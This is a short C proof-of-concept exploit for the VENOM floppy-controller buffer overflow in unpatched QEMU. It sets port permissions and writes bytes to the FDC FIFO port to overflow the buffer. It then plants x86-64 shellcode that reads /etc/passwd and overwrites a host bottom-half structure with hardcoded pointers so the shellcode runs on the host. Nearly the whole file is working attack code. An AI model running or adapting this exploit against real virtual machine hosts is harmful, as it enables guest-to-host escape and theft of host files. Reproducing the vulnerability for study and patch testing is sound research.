/*this is a test code
It's aim is to exploit and recreate possible Venom attack on QEMU before patch
6/2/2015  Yihao Zhang*/
#include<stdio.h>
#include<sys/io.h>
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define BH_COUNT 0x6ff
#define SH_POSITION 0x1ff
#define SH_COUNT 82
#define TEST_VAL  0x11
#define FD_CMD_READ 0x06
#define WRITE 0x05

int main(void){
        unsigned char code[] =  "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41";
        char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
        char cb[8] =    {0x00,0x2b,0x20,0x56,0x55,0x55,0x00,0x00};
        char opaque[8]= {0x40,0xa5,0x1c,0x56,0x55,0x55,0x00,0x00};
        char next[8]=   {0xc0,0x45,0x1d,0x56,0x55,0x55,0x00,0x00};
        char sid[3]= {0x01,0x00,0x00};
        iopl(3);
        ioperm(FIFO, 1, 1);
	// printf("write spc_command to port\n");
        outb(SPC_COMMAND, FIFO);
        int i,j;
        j = BH_COUNT-SH_POSITION-SH_COUNT;
        printf("into loop\n");
        //find a position to write shell code
        for(i=0; i<SH_POSITION; i++ ){
            outb(TEST_VAL,0x3f5);
        }
        //write shell code
        for(i=0;i<SH_COUNT; i++){
            outb(code[i], FIFO);
        }
        // go to bh struct
        for(i=0; i<j; i++){
            outb(TEST_VAL, FIFO);
        }
        //start to rewrite bh struct
        for(i=0; i< 8; i++){
            outb(ctx[i], FIFO);
        }
        for(i=0; i< 8; i++){
            outb(cb[i], FIFO);
        }
        for(i=0; i< 8; i++){
            outb(opaque[i], FIFO);
        }
        for(i=0; i< 8; i++){
            outb(next[i], FIFO);
        }
        for(i=0; i< 3; i++){
            outb(sid[i], FIFO);
        }
        // outb(TEST_VAL, FIFO);
        // outb(RDID, FIFO);
        // outb(TEST_VAL, FIFO);
        // outb(FD_CMD_READ, FIFO);
        // printf("try read: %d\n", inb(0x3f5));
}
